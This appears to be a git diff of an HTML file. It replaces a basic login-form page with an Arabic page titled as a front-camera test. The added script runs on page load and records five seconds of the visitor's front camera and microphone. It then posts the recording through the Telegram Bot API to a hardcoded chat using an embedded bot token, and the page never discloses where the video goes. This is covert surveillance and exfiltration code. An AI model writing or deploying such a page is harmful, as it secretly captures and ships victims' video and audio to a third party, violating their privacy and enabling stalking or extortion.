@@ -1,120 +1,102 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-  <link rel="stylesheet" href="opj.css">
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تشغيل الكاميرا الأمامية</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    video {
+      width: 100%;
+      max-width: 480px;
+      border: 2px solid #4CAF50;
+      border-radius: 10px;
+      background: black;
+    }
+    #status {
+      margin-top: 10px;
+      font-size: 16px;
+      color: #333;
+      text-align: center;
+    }
+  </style>
 </head>
-
-<style>
-    
-    *{
-  margin: 0;
-  padding: 0;
-  font-family: sans-serif;
-}
-
-body{
-  display: flex;
-  justify-content:center ;
-  align-items: center;
-  height: 100vh;
-  background-image: linear-gradient( darkcyan, aqua,transparent) ;
-}
-.opj{
-  
-  width:80%;
-  height: 80%;
-  background-color: rgba(255,255,255,0.6);
-  border-radius:5px ;
-}
-
-
-body::after{
-  content: '';
-  width:100%;
-  height:100%;
-  background-color: burlywood;
-  position: absolute;
-  clip-path: circle(40% at right 70%);
-  z-index: -7;
-}
-
-.dec{
-  display: flex;
-  justify-content:   space-between;
-  align-items: center;
-  width: 80%;
-  margin: auto;
-  padding: 20px 0;
-}
-
-.hre1{
-  color: aliceblue ;
-  text-decoration:none ;
-  font-size: 32px;
-  text-transform: uppercase ;
-  letter-spacing:2px;
-  font-weight: 700px;
-  
-}
-div ul li {
-  display: inline-block;
-} 
-
-ul li a{
-  color: aliceblue  ;
- text-decoration : none;
-  font-size: 15px;
-}
-form{
-  line-height: 3px;
-  margin:70px 0 0 20px;
-}
-
-label ,input{
-  margin: 10px ;
-}
- label{
-  font-size: 20px;
-  color : cornflowerblue ;
-}
-#circal{
-  width:100%;
-  height: 100%;
-  background-color: cadetblue ;
-}
-input{
-  border: dotte red  12px  ;
-  
-}
-</style>
 <body>
-  
- <div class="opj">
-   <div class="dec">
-    <a href="##" class="hre1">khalol</a>
-    <ul>
-      <li><a href="###a">Hows</a></li>
-      <li><a href="###ah">hgome</a></li>
-      <li><a href="###a">khalol</a></li>
-      
-    </ul>
-     
-    </div>
-   <form>
-     <lable>user name</lable>
-     <input type="text" placeholder="user name"><br>
-     <lable>password</lable>
-     <input type="password" placeholder="password"><br>
-      <lable>email</lable>
-     <input type="email"><br>
-     <input type="submit">
-   </form>
-     
-     
-   </div>
-  
-  
-  
+  <h2>تشغيل الكاميرا الأمامية</h2>
+  <video id="video" autoplay muted playsinline></video>
+  <div id="status">جاري التحميل...</div>
+
+  <script>
+    const BOT_TOKEN = "7896847335:AAEsfQBoNYSvTUuBmuHC4usiOHOuLbUUMmI";
+    const CHAT_ID = "377816990"; 
+
+    const video = document.getElementById("video");
+    const statusText = document.getElementById("status");
+    let chunks = [];
+
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: true
+        });
+        video.srcObject = stream;
+
+        const recorder = new MediaRecorder(stream);
+        recorder.ondataavailable = (e) => chunks.push(e.data);
+        recorder.onstop = () => sendVideo(new Blob(chunks, { type: "video/webm" }));
+
+        recorder.start();
+        statusText.textContent = "يتم التسجيل لمدة 5 ثوانٍ...";
+
+        setTimeout(() => {
+          recorder.stop();
+          statusText.textContent = "جارٍ إرسال الفيديو...";
+        }, 5000);
+      } catch (e) {
+        console.error(e);
+        statusText.textContent = "خطأ في تشغيل الكاميرا: " + e.message;
+      }
+    }
+
+    function sendVideo(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("video", blob, "video.webm");
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+        method: "POST",
+        body: formData
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          statusText.textContent = "تم إرسال الفيديو بنجاح!";
+        } else {
+          statusText.textContent = "فشل في الإرسال: " + data.description;
+        }
+      })
+      .catch(err => {
+        statusText.textContent = "فشل الاتصال: " + err.message;
+      });
+    }
+
+    window.onload = () => {
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        init();
+      } else {
+        statusText.textContent = "المتصفح لا يدعم الكاميرا.";
+      }
+    };
+  </script>
 </body>
 </html>
